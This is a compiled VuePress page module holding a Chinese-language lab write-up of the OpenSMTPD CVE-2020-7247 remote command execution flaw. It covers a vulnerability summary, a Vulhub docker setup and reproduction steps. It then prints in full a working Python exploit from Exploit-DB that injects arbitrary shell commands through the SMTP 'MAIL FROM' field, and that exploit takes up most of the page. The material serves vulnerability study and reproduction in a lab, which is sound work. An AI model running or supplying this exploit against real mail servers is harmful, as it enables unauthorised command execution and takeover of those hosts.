import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},u=e('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>OpenSMTPD 是面向 unix 操作系统 (BSD, MacOS, GNU/Linux) 的一个 smtp 服务程序，遵循 RFC 5321 SMTP 协议，OpenSMTPD 最初是为 OpenBSD 操作系统开发的，是 OpenBSD 项目的一部分，由于其开源的特性，进而分发到了其他 unix 平台。根据 ISC 许可，该软件可免费供所有人使用和重用。</p><p><code>CVE-2020-7247</code> 是 OpenSMTPD 在实现 RFC 5321 的过程中对 发件人/收件人 校验不严而导致的。</p><p>2020年01月29日，OpenSMTPD 官方在 github 代码仓库提交了针对 <code>CVE-2020-7247</code> 漏洞的修复，修复后对应版本为<code>OpenSMTPD 6.6.2p1</code>。</p><p>参考链接：</p>',5),r={href:"https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt",target:"_blank",rel:"noopener noreferrer"},d={href:"https://www.exploit-db.com/exploits/47984",target:"_blank",rel:"noopener noreferrer"},k={href:"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.anquanke.com/post/id/197689",target:"_blank",rel:"noopener noreferrer"},v=e(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令，启动OpenSMTPD服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行完成后，使用<code>nc &lt;your-ip&gt; 8825 -v</code> 后应看到如下回显：（<code>44dadcc5a6eb</code>为容器编号）：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281348887.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>220 44dadcc5a6eb ESMTP OpenSMTPD
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,7),b={href:"https://www.exploit-db.com/exploits/47984",target:"_blank",rel:"noopener noreferrer"},g=e(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 poc.py your-ip 8825 &lt;command&gt; 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行命令<code>touch /tmp/awesome_poc</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281411957.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>命令执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281411586.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution</span>
<span class="token comment"># Date: 2020-01-29</span>
<span class="token comment"># Exploit Author: 1F98D</span>
<span class="token comment"># Original Author: Qualys Security Advisory</span>
<span class="token comment"># Vendor Homepage: https://www.opensmtpd.org/</span>
<span class="token comment"># Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1</span>
<span class="token comment"># Version: OpenSMTPD &lt; 6.6.2</span>
<span class="token comment"># Tested on: Debian 9.11 (x64)</span>
<span class="token comment"># CVE: CVE-2020-7247</span>
<span class="token comment"># References:</span>
<span class="token comment"># https://www.openwall.com/lists/oss-security/2020/01/28/3</span>
<span class="token comment">#</span>
<span class="token comment"># OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately</span>
<span class="token comment"># escape dangerous characters from user-controlled input. An attacker</span>
<span class="token comment"># can exploit this to execute arbitrary shell commands on the target.</span>
<span class="token comment"># </span>
<span class="token comment">#!/usr/local/bin/python3</span>

<span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sys

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Usage {} &lt;target ip&gt; &lt;target port&gt; &lt;command&gt;&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;E.g. {} 127.0.0.1 25 &#39;touch /tmp/x&#39;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

ADDR <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
PORT <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
CMD <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>

s <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ADDR<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

res <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token string">&#39;OpenSMTPD&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] No OpenSMTPD detected&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Received {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Exiting...&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] OpenSMTPD detected&#39;</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b&#39;HELO x\\r\\n&#39;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token string">&#39;250&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Error connecting, expected 250&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Received: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Exiting...&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Connected, sending payload&#39;</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token string">&#39;MAIL FROM:&lt;;{};&gt;\\r\\n&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>CMD<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token string">&#39;250&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Error sending payload, expected 250&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Received: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Exiting...&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Payload sent&#39;</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b&#39;RCPT TO:&lt;root&gt;\\r\\n&#39;</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b&#39;DATA\\r\\n&#39;</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b&#39;\\r\\nxxx\\r\\n.\\r\\n&#39;</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b&#39;QUIT\\r\\n&#39;</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Done&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7);function h(y,w){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,n("ul",null,[n("li",null,[n("a",r,[s("https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt"),t(a)])]),n("li",null,[n("a",d,[s("https://www.exploit-db.com/exploits/47984"),t(a)])]),n("li",null,[n("a",k,[s("https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247"),t(a)])]),n("li",null,[n("a",m,[s("https://www.anquanke.com/post/id/197689"),t(a)])])]),v,n("p",null,[s("使用"),n("a",b,[s("Exploit-DB"),t(a)]),s("上的POC进行复现：")]),g])}const _=p(l,[["render",h],["__file","OpenSMTPD 远程命令执行漏洞 CVE-2020-7247.html.vue"]]);export{_ as default};
